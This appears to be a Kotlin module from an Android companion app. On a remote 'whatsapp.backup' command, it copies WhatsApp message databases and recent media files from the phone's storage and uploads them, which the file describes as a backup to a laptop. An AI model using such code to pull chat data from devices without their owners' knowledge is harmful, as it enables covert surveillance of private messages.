package com.yourname.litelinkcompanion.commands

import android.content.Context
import android.os.Environment
import org.json.JSONObject
import java.io.File

/** Copy WhatsApp database + media backups to the laptop. */
object WhatsAppBackupModule {

    fun register(app: Context) {
        CommandCenter.register("whatsapp.backup") { ctx, id, params ->
            val includeMedia = params.optBoolean("include_media", true)
            val roots = candidateRoots()
            val found = roots.filter { it.exists() }
            if (found.isEmpty()) {
                ctx.fail(id, "no WhatsApp data found")
                return@register
            }
            val root = found.first()
            val outDir = File(app.cacheDir, "whatsapp").apply { mkdirs() }

            // Databases (msgstore.db / msgstore-YYYY.db / wa.db)
            val dbs = mutableListOf<File>()
            val dbDir = File(root, "Databases")
            if (dbDir.isDirectory) {
                dbDir.listFiles()?.filter {
                    it.name.startsWith("msgstore") || it.name == "wa.db"
                }?.sortedByDescending { it.name }?.take(3)?.forEach { dbs.add(it) }
            }

            var uploaded = 0
            var failed = 0

            // Upload the newest database first.
            dbs.sortedByDescending { it.lastModified() }.take(1).forEach { db ->
                val target = File(outDir, db.name)
                try {
                    db.copyTo(target, overwrite = true)
                    if (FileTransferModule.uploadFile(app, target.absolutePath, db.name, "whatsapp")) {
                        uploaded++
                    } else {
                        failed++
                    }
                } catch (e: Exception) {
                    failed++
                }
            }

            if (includeMedia) {
                // Media, shared (videos/photos), limited to newest handful to keep it fast.
                val mediaRoots = listOf(File(root, "Media"), File(root, "Shared"))
                val candidates = mutableListOf<File>()
                mediaRoots.forEach { mr ->
                    collectNewest(mr, candidates, 20)
                }
                candidates.forEach { f ->
                    val rel = root.toURI().relativize(f.toURI()).path
                    if (FileTransferModule.uploadFile(app, f.absolutePath, "media/$rel", "whatsapp")) {
                        uploaded++
                    } else {
                        failed++
                    }
                }
            }

            ctx.reply(id, JSONObject().apply {
                put("root", root.absolutePath)
                put("uploaded", uploaded)
                put("failed", failed)
            })
        }
    }

    private fun candidateRoots(): List<File> {
        val public = Environment.getExternalStorageDirectory()
        return listOf(
            File(public, "Android/media/com.whatsapp/WhatsApp"),
            File(public, "WhatsApp"),
            File(public, "Android/data/com.whatsapp/files/WhatsApp"),
            File(public, "Download/WhatsApp")
        )
    }

    private fun collectNewest(dir: File, out: MutableList<File>, max: Int) {
        if (out.size >= max || !dir.isDirectory) return
        dir.listFiles()?.forEach { f ->
            if (out.size >= max) return
            if (f.isFile) out.add(f) else collectNewest(f, out, max)
        }
    }
}
